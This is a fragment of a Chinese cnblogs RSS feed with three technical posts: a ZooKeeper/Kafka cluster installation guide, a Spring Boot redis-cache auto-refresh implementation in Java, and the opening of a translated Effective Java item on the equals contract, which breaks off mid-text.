<guid isPermaLink="true" >http://www.cnblogs.com/liushuqing/p/11702760.html</guid>
<description>&lt;p&gt;ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、集群管理等。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1819381/201910/1819381-20191019084258711-1181580282.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;因为Kafka集群是把状态信息保存在Zookeeper中的，并且Kafka的动态扩容是通过Zookeeper来实现的，所以需要优先搭建Zookeerper集群，建立分布式状态管理。开始准备环境，搭建集群：&lt;/p&gt;
&lt;p&gt;zookeeper是基于Java环境开发的所以需要先安装Java 然后这里使用的zookeeper安装包版本为zookeeper-3.4.14，Kafka的安装包版本为kafka_2.11-2.2.0。&lt;/p&gt;
&lt;p&gt;AMQP协议：Advanced Message Queuing Protocol （高级消息队列协议）是一个标准开放的应用层的消息中间件协议。AMQP定义了通过网络发送的字节流的数据格式。因此兼容性非常好，任何实现AMQP协议的程序都可以和与AMQP协议兼容的其他程序交互，可以很容易做到跨语言，跨平台。&lt;/p&gt;
&lt;p&gt;server1：192.168.42.128&lt;/p&gt;
&lt;p&gt;server2：192.168.42.129&lt;/p&gt;
&lt;p&gt;server3：192.168.42.130&lt;/p&gt;
&lt;p&gt;安装之前先检查一下系统有没有自带open-jdk&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;p&gt;rpm -qa |grep java&lt;/p&gt;
&lt;p&gt;rpm -qa |grep jdk&lt;/p&gt;
&lt;p&gt;如果没有输入信息表示没有安装。&lt;br/&gt;检索1.8的列表&lt;br/&gt;yum list java-1.8*&lt;br/&gt;安装1.8.0的所有文件&lt;br/&gt;yum install java-1.8.0-openjdk* -y&lt;/p&gt;
&lt;p&gt;使用命令检查是否安装成功&lt;br/&gt;java -version&lt;/p&gt;
&lt;p&gt;cat /etc/hosts&lt;/p&gt;
&lt;p&gt;192.168.42.128 kafka01&lt;/p&gt;
&lt;p&gt;192.168.42.129 kafka02&lt;/p&gt;
&lt;p&gt;192.168.42.130 kafka03&lt;/p&gt;
&lt;p&gt;1.关闭selinux，防火墙。&lt;/p&gt;
&lt;p&gt;setenforce 0&lt;/p&gt;
&lt;p&gt;systemctl stop firewalld &amp;amp;&amp;amp; systemctl disable firewalld&lt;/p&gt;
&lt;p&gt;2.创建zookeeper和Kafka的存放目录：&lt;/p&gt;
&lt;p&gt;cd /usr/local/&lt;/p&gt;
&lt;p&gt;wget http://mirrors.cnnic.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz&lt;/p&gt;
&lt;p&gt;wget http://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.2.0/kafka_2.11-2.2.0.tgz&lt;/p&gt;
&lt;p&gt;tar xzvf zookeeper-3.4.14.tar.gz&lt;/p&gt;
&lt;p&gt;tar xzvf kafka_2.11-2.2.0.tgz&lt;/p&gt;
&lt;p&gt;mkdir -pv zookeeper/{zkdata,zkdatalog} #zkdata是存放快照日志，zkdatalog是存放事物日志&lt;/p&gt;
&lt;p&gt;mkdir -pv kafka/kfdatalogs #kfdatalogs是存放消息日志&lt;/p&gt;
&lt;p&gt;4.生成并更改zookeeper的配置文件（三台服务器上都需要设置）：&lt;/p&gt;
&lt;p&gt;#可以将zoo_sample理解为zookeeper自带的配置文件模板，复制出一份以.cfg结尾的配置文件。&lt;/p&gt;
&lt;p&gt;cp -av /usr/local/zookeeper/conf/{zoo_sample,zoo.cfg}&lt;/p&gt;
&lt;p&gt;tickTime=2000 #zookeeper服务器之间的心跳时间。&lt;/p&gt;
&lt;p&gt;initLimit=10 #zookeeper的最大连接失败时间&lt;/p&gt;
&lt;p&gt;syncLimit=5 #zookeeper的同步通信时间&lt;/p&gt;
&lt;p&gt;dataDir=/usr/local/zookeeper/zkdata #zookeeper的存放快照日志的绝对路径&lt;/p&gt;
&lt;p&gt;dataLogDir=/usr/local/zookeeper/zkdatalog #zookeeper的存放事物日志的绝对路径&lt;/p&gt;
&lt;p&gt;clientPort=2181 #zookeeper与客户端的连接端口&lt;/p&gt;
&lt;p&gt;server.1=192.168.11.139:2888:3888 #服务器及其编号，服务器IP地址，通信端口，选举端口&lt;/p&gt;
&lt;p&gt;server.2=192.168.11.140:2888:3888 #服务器及其编号，服务器IP地址，通信端口，选举端口&lt;/p&gt;
&lt;p&gt;server.3=192.168.11.141:2888:3888 #服务器及其编号，服务器IP地址，通信端口，选举端口&lt;/p&gt;
&lt;p&gt;#以上端口都是zookeeper的默认端口，可随需求进行修改&lt;/p&gt;
&lt;p&gt;5.创建myid文件：&lt;/p&gt;
&lt;p&gt;在server1上&lt;/p&gt;
&lt;p&gt;echo “1” &amp;gt; /usr/local/zookeeper/zkdata/myid&lt;/p&gt;
&lt;p&gt;#就是在不同的服务器上，将服务器编号发送到zkdata下的myid。&lt;/p&gt;
&lt;p&gt;6.启动zookeeper集群&lt;/p&gt;
&lt;p&gt;cd /usr/local/zookeeper/bin&lt;/p&gt;
&lt;p&gt;./zkServer.sh start&lt;/p&gt;
&lt;p&gt;./zkServer.sh status&lt;/p&gt;
&lt;p&gt;#Mode: leader为主节点，Mode: follower为从节点，zk集群一般只有一个leader，多个follower，主一般是响应客户端的读写请求，而从主同步数据，当主挂掉之后就会从follower里投票选举一个leader出来。&lt;/p&gt;
&lt;p&gt;zookeeper 选举过程/工作原理&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/wyqwilliam/article/details/83537139&lt;/p&gt;
&lt;p&gt;在zookeeper的集群中，各个节点共有下面3种角色和4种状态：&lt;/p&gt;
&lt;p&gt;角色：leader，follower，observer&lt;/p&gt;
&lt;p&gt;状态：leading，following，observing，looking&lt;/p&gt;
&lt;p&gt;每个Server在工作过程中有4种状态：&lt;/p&gt;
&lt;p&gt;LOOKING：当前Server不知道leader是谁，正在搜寻。&lt;/p&gt;
&lt;p&gt;LEADING：当前Server即为选举出来的leader。&lt;/p&gt;
&lt;p&gt;FOLLOWING：leader已经选举出来，当前Server与之同步。&lt;/p&gt;
&lt;p&gt;OBSERVING：observer的行为在大多数情况下与follower完全一致，但是他们不参加选举和投票，而仅仅接受(observing)选举和投票的结果&lt;/p&gt;
&lt;p&gt;到此，zookeeper集群搭建结束，接下来基于zookeeper搭建kafka集群：&lt;/p&gt;
&lt;p&gt;Kafka的基本概念：&lt;/p&gt;
&lt;p&gt;主题：Topic特指Kafka处理的消息源（feeds of messages）的不同分类。&lt;/p&gt;
&lt;p&gt;分区：Partition Topic物理上的分组，一个topic可以分为多个partition，每个partition是一个有序的队列。partition中的每条消息都会被分配一个有序的id（offset）。&lt;/p&gt;
&lt;p&gt;Message：消息，是通信的基本单位，每个producer可以向一个topic（主题）发布一些消息。&lt;/p&gt;
&lt;p&gt;Producers：消息的数据生产者，向Kafka的一个topic发布消息的过程叫做producers。&lt;/p&gt;
&lt;p&gt;Consumers：消息的数据消费者，订阅topics并处理其发布的消息的过程叫做consumers。&lt;/p&gt;
&lt;p&gt;Broker：缓存代理，Kafka集群中的一台或多台服务器统称为broker，这里用的是AMQP协议。&lt;/p&gt;
&lt;p&gt;cd /usr/local/kafka/config/&lt;/p&gt;
&lt;p&gt;1.修改server.properties文件：&lt;/p&gt;
&lt;p&gt;broker.id=1 #这里和zookeeper中的myid文件一样，采用的是唯一标识&lt;/p&gt;
&lt;p&gt;prot=9092 #Kafka集群间连接的端口，配置文件中没有，但默认为9092，可随需求进行修改，这里咱们加上&lt;/p&gt;
&lt;p&gt;log.dirs=/usr/local/kafka/kfdatalogs #存放Kafka消息日志的绝对路径&lt;/p&gt;
&lt;p&gt;advertised.listeners=PLAINTEXT://kafka01:9092&lt;/p&gt;
&lt;p&gt;log.retention.hours=168 #默认消息的最大持久化时间，168小时，7天&lt;/p&gt;
&lt;p&gt;message.max.byte=5242880 #消息保存的最大值5M&lt;/p&gt;
&lt;p&gt;default.replication.factor=2 #kafka保存消息的副本数，如果一个副本失效了，另一个还可以继续提供服务&lt;/p&gt;
&lt;p&gt;replica.fetch.max.bytes=5242880 #取消息的最大直接数&lt;/p&gt;
&lt;p&gt;zookeeper.connect=192.168.42.128:2181,192.168.42.129:2181,192.168.42.130:2181#集群的各个节点的IP地址及zookeeper的端口，在zookeeper集群设置的端口是多少这里的端口就是多少。&lt;/p&gt;
&lt;p&gt;未修改的配置文件信息：&lt;/p&gt;
&lt;p&gt;num.network.threads=3 #这个是borker进行网络处理的线程数&lt;/p&gt;
&lt;p&gt;num.io.threads=8 #这个是borker进行I/O处理的线程数&lt;/p&gt;
&lt;p&gt;num.partitions=1 #默认的分区数，一个topic默认1个分区数&lt;/p&gt;
&lt;p&gt;log.retention.hours=168 #默认消息的最大持久化时间，168小时，7天&lt;/p&gt;
&lt;p&gt;message.max.byte=5242880 #消息保存的最大值5M&lt;/p&gt;
&lt;p&gt;default.replication.factor=2 #kafka保存消息的副本数，如果一个副本失效了，另一个还可以继续提供服务&lt;/p&gt;
&lt;p&gt;replica.fetch.max.bytes=5242880 #取消息的最大直接数&lt;/p&gt;
&lt;p&gt;log.segment.bytes=1073741824 #这个参数是：因为kafka的消息是以追加的形式落地到文件，当超过这个值的时候，kafka会新起一个文件&lt;/p&gt;
&lt;p&gt;log.retention.check.interval.ms=300000 #每隔300000毫秒去检查上面配置的log失效时间（log.retention.hours=168 ），到目录查看是否有过期的消息如果有，删除&lt;/p&gt;
&lt;p&gt;log.cleaner.enable=false #是否启用log压缩，一般不用启用，启用的话可以提高性能&lt;/p&gt;
&lt;p&gt;2.启动Kafka集群：&lt;/p&gt;
&lt;p&gt;cd /usr/local/kafka/bin&lt;/p&gt;
&lt;p&gt;bash kafka-server-start.sh -daemon …/config/server.properties&lt;/p&gt;
&lt;p&gt;3.开始测试：&lt;/p&gt;
&lt;p&gt;3.1创建topic&lt;/p&gt;
&lt;p&gt;./kafka-topics.sh --create --zookeeper 192.168.21.241：2181 --replication-factor 2 --partitions 1 --topic wg01&lt;/p&gt;
&lt;p&gt;#–replication-factor 2 复制两份&lt;/p&gt;
&lt;p&gt;#–partitions 1 创建一个分区&lt;/p&gt;
&lt;p&gt;#–topic tian 主题为tian&lt;/p&gt;
&lt;p&gt;3.2创建一个producter：&lt;/p&gt;
&lt;p&gt;./kafka-console-producer.sh --broker-list 192.168.21.241:9092 --topic wg01&lt;/p&gt;
&lt;p&gt;3.3创建一个consumer：&lt;/p&gt;
&lt;p&gt;./kafka-console-consumer.sh --bootstrap-server 192.168.11.141:9092 --topic wg01 --from-beginning&lt;/p&gt;
&lt;p&gt;3.4查看topic：&lt;/p&gt;
&lt;p&gt;./kafka-topics.sh --list --zookeeper 192.168.11.141:2181&lt;br/&gt;————————————————&lt;br/&gt;版权声明：本文为CSDN博主「大阿弃❀」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。&lt;br/&gt;原文链接：https://blog.csdn.net/TH_lsq/article/details/102626967&lt;/p&gt;
</description>
<pubDate>Sat, 19 Oct 2019 00:43:00 +0000</pubDate>
<dc:creator>快乐的人啊</dc:creator>
<og:description>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liushuqing/p/11702760.html</dc:identifier>
</item>
<item>
<title>springboot redis-cache 自动刷新缓存 - sanri1993</title>
<link>http://www.cnblogs.com/sanri1993/p/11702753.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sanri1993/p/11702753.html</guid>
<description>&lt;p&gt;这篇文章是对上一篇 &lt;a href=&quot;https://blog.csdn.net/sanri1993/article/details/102535170&quot;&gt;spring-data-redis-cache 的使用&lt;/a&gt; 的一个补充，上文说到 spring-data-redis-cache 虽然比较强悍，但还是有些不足的，它是一个通用的解决方案，但对于企业级的项目，住住需要解决更多的问题，常见的问题有&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;缓存预热（项目启动时加载缓存）&lt;/li&gt;
&lt;li&gt;缓存穿透（空值直接穿过缓存）&lt;/li&gt;
&lt;li&gt;缓存雪崩（大量缓存在同一时刻过期）&lt;/li&gt;
&lt;li&gt;缓存更新（查询到的数据为旧数据问题）&lt;/li&gt;
&lt;li&gt;缓存降级&lt;/li&gt;
&lt;li&gt;redis 缓存时，redis 内存用量问题&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;本文解决的问题&quot;&gt;本文解决的问题&lt;/h2&gt;
&lt;p&gt;增强 spring-data-redis-cache 的功能，增强的功能如下&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;自定义注解实现配置缓存的过期时间&lt;/li&gt;
&lt;li&gt;当取缓存数据时检测是否已经达到刷新数据阀值，如已达到，则主动刷新缓存&lt;/li&gt;
&lt;li&gt;当检测到存入的数据为空数据，包含集体空，map 空，空对象，空串，空数组时，设定特定的过期时间&lt;/li&gt;
&lt;li&gt;可以批量设置过期时间，使用 Kryo 值序列化&lt;/li&gt;
&lt;li&gt;重写了 key 生成策略，使用 MD5(target+method+params)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;看网上大部分文章都是互相抄袭，而且都是旧版本的，有时还有错误，本文提供一个 &lt;strong&gt;spring-data-redis-2.0.10.RELEASE.jar&lt;/strong&gt; 版本的解决方案。本文代码是经过测试的，但未在线上环境验证，使用时需注意可能存在 bug 。&lt;/p&gt;
&lt;h3 id=&quot;实现思路&quot;&gt;实现思路&lt;/h3&gt;
&lt;p&gt;过期时间的配置很简单，修改 &lt;code&gt;initialCacheConfiguration&lt;/code&gt; 就可以实现，下面说的是刷新缓存的实现&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;拦截 &lt;code&gt;@Cacheable&lt;/code&gt; 注解，如果执行的方法是需要刷新缓存的，则注册一个 &lt;code&gt;MethodInvoker&lt;/code&gt; 存储到 redis ，使用和存储 key 相同的键名再拼接一个后缀&lt;/li&gt;
&lt;li&gt;当取缓存的时候，如果 key 的过期时间达到了刷新阀值，则从 redis 取到当前 cacheKey 的 &lt;code&gt;MethodInvoker&lt;/code&gt; 然后执行方法&lt;/li&gt;
&lt;li&gt;将上一步的值存储进缓存，并重置过期时间&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;引言&quot;&gt;引言&lt;/h3&gt;
&lt;p&gt;本文使用到的 spring 的一些方法的说明&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 可以从目标对象获取到真实的 class 对象，而不是代理 class 类对象
Class&amp;lt;?&amp;gt; targetClass = AopProxyUtils.ultimateTargetClass(target);&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Object bean = applicationContext.getBean(targetClass);
// 获取到真实的对象，而不是代理对象 
Object target = AopProxyUtils.getSingletonTarget(bean );&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;MethodInvoker 是 spring 封装的一个用于执行方法的工具，在拦截器中，我把它序列化到 redis&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;MethodInvoker methodInvoker = new MethodInvoker();
methodInvoker.setTargetClass(targetClass);
methodInvoker.setTargetMethod(method.getName());
methodInvoker.setArguments(args);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SpringCacheAnnotationParser 是 Spring 用来解析 cache 相关注解的，我拿来解析 cacheNames ，我就不需要自己来解析 cacheNames 了，毕竟它可以在类上配置，解析还是有点小麻烦。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;SpringCacheAnnotationParser annotationParser = new SpringCacheAnnotationParser();&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;实现部分&quot;&gt;实现部分&lt;/h3&gt;
&lt;p&gt;自定义注解，配置过期时间和刷新阀值&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.METHOD,ElementType.TYPE})
public @interface CacheCustom {
    /**
     * 缓存失效时间
     * 使用 ISO-8601持续时间格式
     * Examples:
     *   &amp;lt;pre&amp;gt;
     *      &quot;PT20.345S&quot; -- parses as &quot;20.345 seconds&quot;
     *      &quot;PT15M&quot;     -- parses as &quot;15 minutes&quot; (where a minute is 60 seconds)
     *      &quot;PT10H&quot;     -- parses as &quot;10 hours&quot; (where an hour is 3600 seconds)
     *      &quot;P2D&quot;       -- parses as &quot;2 days&quot; (where a day is 24 hours or 86400 seconds)
     *      &quot;P2DT3H4M&quot;  -- parses as &quot;2 days, 3 hours and 4 minutes&quot;
     *      &quot;P-6H3M&quot;    -- parses as &quot;-6 hours and +3 minutes&quot;
     *      &quot;-P6H3M&quot;    -- parses as &quot;-6 hours and -3 minutes&quot;
     *      &quot;-P-6H+3M&quot;  -- parses as &quot;+6 hours and -3 minutes&quot;
     *   &amp;lt;/pre&amp;gt;
     * @return
     */
    String expire() default &quot;PT60s&quot;;

    /**
     * 刷新时间阀值，不配置将不会进行缓存刷新
     * 对于像前端的分页条件查询，建议不配置，这将在内存生成一个执行映射，太多的话将会占用太多的内存使用空间
     * 此功能适用于像字典那种需要定时刷新缓存的功能
     * @return
     */
    String threshold() default &quot;&quot;;

    /**
     * 值的序列化方式
     * @return
     */
    Class&amp;lt;? extends RedisSerializer&amp;gt; valueSerializer() default KryoRedisSerializer.class;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建一个 aop 切面，将执行器存储到 redis&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Aspect
@Component
public class CacheCustomAspect {
    @Autowired
    private KeyGenerator keyGenerator;

    @Pointcut(&quot;@annotation(com.sanri.test.testcache.configs.CacheCustom)&quot;)
    public void pointCut(){}

    public static final String INVOCATION_CACHE_KEY_SUFFIX = &quot;:invocation_cache_key_suffix&quot;;

    @Autowired
    private RedisTemplate redisTemplate;

    @Before(&quot;pointCut()&quot;)
    public void registerInvoke(JoinPoint joinPoint){
        Object[] args = joinPoint.getArgs();
        MethodSignature methodSignature = (MethodSignature) joinPoint.getSignature();
        Method method = methodSignature.getMethod();
        Object target = joinPoint.getTarget();

        Object cacheKey = keyGenerator.generate(target, method, args);
        String methodInvokeKey = cacheKey + INVOCATION_CACHE_KEY_SUFFIX;
        if(redisTemplate.hasKey(methodInvokeKey)){
            return ;
        }

        // 将方法执行器写入 redis ,然后需要刷新的时候从 redis 获取执行器,根据 cacheKey ,然后刷新缓存
        Class&amp;lt;?&amp;gt; targetClass = AopProxyUtils.ultimateTargetClass(target);
        MethodInvoker methodInvoker = new MethodInvoker();
        methodInvoker.setTargetClass(targetClass);
        methodInvoker.setTargetMethod(method.getName());
        methodInvoker.setArguments(args);
        redisTemplate.setKeySerializer(new StringRedisSerializer());
        redisTemplate.setValueSerializer(new KryoRedisSerializer());
        redisTemplate.opsForValue().set(methodInvokeKey,methodInvoker);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;重写 RedisCache 的 get 方法，在获取缓存的时候查看它的过期时间，如果小于刷新阀值，则另启线程进行刷新，这里需要考虑并发问题，目前我是同步刷新的。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override
public ValueWrapper get(Object cacheKey) {
    if(cacheCustomOperation == null){return super.get(cacheKey);}

    Duration threshold = cacheCustomOperation.getThreshold();
    if(threshold == null){
        // 如果不需要刷新,直接取值
        return super.get(cacheKey);
    }

    //判断是否需要刷新
    Long expire = redisTemplate.getExpire(cacheKey);
    if(expire != -2 &amp;amp;&amp;amp; expire &amp;lt; threshold.getSeconds()){
        log.info(&quot;当前剩余过期时间[&quot;+expire+&quot;]小于刷新阀值[&quot;+threshold.getSeconds()+&quot;],刷新缓存:&quot;+cacheKey+&quot;,在 cacheNmae为 :&quot;+this.getName());
        synchronized (CustomRedisCache.class) {
            refreshCache(cacheKey.toString(), threshold);
        }
    }

    return super.get(cacheKey);
}

/**
 * 刷新缓存
 * @param cacheKey
 * @param threshold
 * @return
*/
private void refreshCache(String cacheKey, Duration threshold) {
    String methodInvokeKey = cacheKey + CacheCustomAspect.INVOCATION_CACHE_KEY_SUFFIX;
    MethodInvoker methodInvoker = (MethodInvoker) redisTemplate.opsForValue().get(methodInvokeKey);
    if(methodInvoker != null){
        Class&amp;lt;?&amp;gt; targetClass = methodInvoker.getTargetClass();
        Object target = AopProxyUtils.getSingletonTarget(applicationContext.getBean(targetClass));
        methodInvoker.setTargetObject(target);
        try {
            methodInvoker.prepare();
            Object invoke = methodInvoker.invoke();

            //然后设置进缓存和重新设置过期时间
            this.put(cacheKey,invoke);
            long ttl = threshold.toMillis();
            redisTemplate.expire(cacheKey,ttl, TimeUnit.MILLISECONDS);
        } catch (InvocationTargetException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException e) {
            log.error(&quot;刷新缓存失败:&quot;+e.getMessage(),e);
        }

    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后重写 RedisCacheManager 把自定义的 RedisCache 交由其管理&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override
public Cache getCache(String cacheName) {
    CacheCustomOperation cacheCustomOperation = cacheCustomOperationMap.get(cacheName);
    RedisCacheConfiguration redisCacheConfiguration = initialCacheConfiguration.get(cacheName);
    if(redisCacheConfiguration == null){redisCacheConfiguration = defaultCacheConfiguration;}

    CustomRedisCache customRedisCache = new CustomRedisCache(cacheName,cacheWriter,redisCacheConfiguration, redisTemplate, applicationContext, cacheCustomOperation);
    customRedisCache.setEmptyKeyExpire(this.emptyKeyExpire);
    return customRedisCache;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明：本文只是截取关键部分代码，完整的代码在 gitee 上&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gitee.com/sanri/example/tree/master/test-springboot-cache&quot;&gt;完整代码下载&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;其它说明&quot;&gt;其它说明&lt;/h3&gt;
&lt;p&gt;由于 key 使用了 md5 生成，一串乱码也不知道存储的什么方法，这里提供一种解决方案，可以对有刷新时间的 key 取到其对应的方法。其实就是我在拦截器中有把当前方法的执行信息存储进 redis ，是对应那个 key 的，可以进行反序列化解析出执行类和方法信息。&lt;/p&gt;
&lt;h2 id=&quot;一点小推广&quot;&gt;一点小推广&lt;/h2&gt;
&lt;p&gt;创作不易，希望可以支持下我的开源软件，及我的小工具，欢迎来 gitee 点星，fork ，提 bug 。&lt;/p&gt;
&lt;p&gt;Excel 通用导入导出，支持 Excel 公式&lt;br/&gt;博客地址：&lt;a href=&quot;https://blog.csdn.net/sanri1993/article/details/100601578&quot; class=&quot;uri&quot;&gt;https://blog.csdn.net/sanri1993/article/details/100601578&lt;/a&gt;&lt;br/&gt;gitee：&lt;a href=&quot;https://gitee.com/sanri/sanri-excel-poi&quot; class=&quot;uri&quot;&gt;https://gitee.com/sanri/sanri-excel-poi&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用模板代码 ，从数据库生成代码 ，及一些项目中经常可以用到的小工具&lt;br/&gt;博客地址：&lt;a href=&quot;https://blog.csdn.net/sanri1993/article/details/98664034&quot; class=&quot;uri&quot;&gt;https://blog.csdn.net/sanri1993/article/details/98664034&lt;/a&gt;&lt;br/&gt;gitee：&lt;a href=&quot;https://gitee.com/sanri/sanri-tools-maven&quot; class=&quot;uri&quot;&gt;https://gitee.com/sanri/sanri-tools-maven&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 19 Oct 2019 00:36:00 +0000</pubDate>
<dc:creator>sanri1993</dc:creator>
<og:description>这篇文章是对上一篇 'spring data redis cache 的使用' 的一个补充，上文说到 spring data redis cache 虽然比较强悍，但还是有些不足的，它是一个通用的解决</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sanri1993/p/11702753.html</dc:identifier>
</item>
<item>
<title>第10项：重写equals时请遵守通用约定 - coloured_glaze</title>
<link>http://www.cnblogs.com/coloured_glaze/p/11702733.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/coloured_glaze/p/11702733.html</guid>
<description>&lt;p&gt;  重写equals方法看起来似乎很简单，但是有许多重写方式会导致错误，而且后果非常严重。最容易避免这类问题的办法就是不覆盖equals方法，在这种情况下，类的每个实例都只能与它自身相等。如果满足了以下任何一个条件，那就是正确的做法：&lt;/p&gt;
&lt;ul readability=&quot;5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;类的每个实例都是唯一的。&lt;/strong&gt;　对于代表活动实体而不是值（value）的类来说确实如此，例如Thread。Object提供的equals实现对这些类具有完全正确的行为（The equals implementation provided by Object has exactly the right behavior for these classes）。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;不关心类是否提供了“逻辑相等（logical equality）”的测试功能。&lt;/strong&gt;　例如，java.util.regex.Pattern可以重写equals检查两个Pattern实例是否表示完全相同的正则表达式，但设计者并不认为客户端需要或想要此功能。 在这种情况下，从Object继承的equals实现是理想的方式。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;超类已经重写了equals，从超类继承过来的行为对于子类也是合适的。&lt;/strong&gt;　例如，大多数的Set实现都从AbstractSet继承equals实现，List实现从AbstractList继承equals实现，Map实现从AbstractMap继承equals实现。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;类是私有的或者是包级私有的，可以确定它的equals方法永远不会被调用。&lt;/strong&gt;　如果你非常讨厌风险，你可以重写equals方法，从而确保它不会被意外调用：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override public boolean equals(Object o) {
    throw new AssertionError(); // Method is never called
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  那么什么时候重写equals方法才是合适的呢？当一个类具有逻辑相等的概念时（不同于对象本身相同的概念），而超类还没有重写equals。 这通常是“值类（value class）”的情况。 值类指的是只表示值的类，例如Integer或String。程序猿在利用equals方法来比较对象的引用时，希望知道它们在逻辑上是否相等，而不是像了解它们是否引用了相同的对象。为了满足程序猿的需求，不仅必须重写equals方法，而且这样做也使得这个类的实例可以被用作映射表（map）的键（key），或者集合（set）的元素，使映射或者集合表现出预期的行为。&lt;/p&gt;
&lt;p&gt;  有一种“值类”不需要重写equals方法，即用实例受控（第1项）确保“每个值之多只存在一个对象”的类【单例模式】。枚举类型（第34项）就属于这种类。对于这样的类而言，逻辑相同与对象等同是一回事，因此Object的equals方法等同于逻辑意义上的equals方法。&lt;/p&gt;
&lt;p&gt;  当你重写equals方法的时候，你一定要遵守它的通用约定。下面是约定的内容，来自Object的规范：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;自反性（Reflexive）&lt;/strong&gt;：对于任何非null的引用值x，x.equals(x)必须返回true。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对称性（Symmetric）&lt;/strong&gt;：对于任何非null的引用值x和y，当且仅当y.equals(x)返回true时，x.equals(y)必须返回true。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传递性（Transitive）&lt;/strong&gt;：对于任何非null的引用值x、y和z，如果x.equals(y)返回true，并且y.equals(z)也返回true，那么x.equals(z)也必须返回true。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;一致性（Consistent）&lt;/strong&gt;：对于任何非null的引用值x和y，只要equals的比较操作在对象中所用的信息没有被修改，多次调用x.equals(y)就会一致返回true，或者一致返地返回false。&lt;/li&gt;
&lt;li&gt;对于任何非null的引用值x，x.equals(null)必须返回false。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;  除非你对数学特别感兴趣，否则这些规定看起来可能有点让人感到恐惧，但是绝对不要忽视这些规定！如果你违反了它们，就会发现你的程序表现不正常，甚至崩溃，而且很难阻止失败的根源（and it can be very difficult to pin down the source of the failure）。引用John Donne的话说，没有哪个类是孤立的。一个类的实例通常会被频繁地传递给另一个类的实例。有许多类，包括所有的集合类（collections classes）在内，都依赖于传递给它们的对象是否遵守了equals约定。&lt;/p&gt;
&lt;p&gt;  现在你已经知道了违反equals约定有多么可怕，现在我们就来更细致地讨论这些约定。值得欣慰的是，这些约定虽然看起来很吓人，实际上并不复杂。一旦你理解了这些约定，要遵守它们并不困难。&lt;/p&gt;
&lt;p&gt;  那么什么是等价关系呢？大致来说，它是一个运算符，它将一组元素分成子集，这些子集的元素被认为是彼此相等的。这些子集称为等价类。 要使equals方法有用，每个等价类中的所有元素必须可以从用户的角度进行互换。现在我们依次检查一下5个要求：&lt;/p&gt;
&lt;p&gt;  &lt;strong&gt;自反性（Reflexivity）&lt;/strong&gt;————第一个要求仅仅说明对象必须等于其自身。很难想象会无意识地违反这一条。假如违背了这一条，然后把该类的实例添加到集合（collection）中，该集合的contains方法将会告诉你，该集合不包含你刚才添加的实例。&lt;/p&gt;
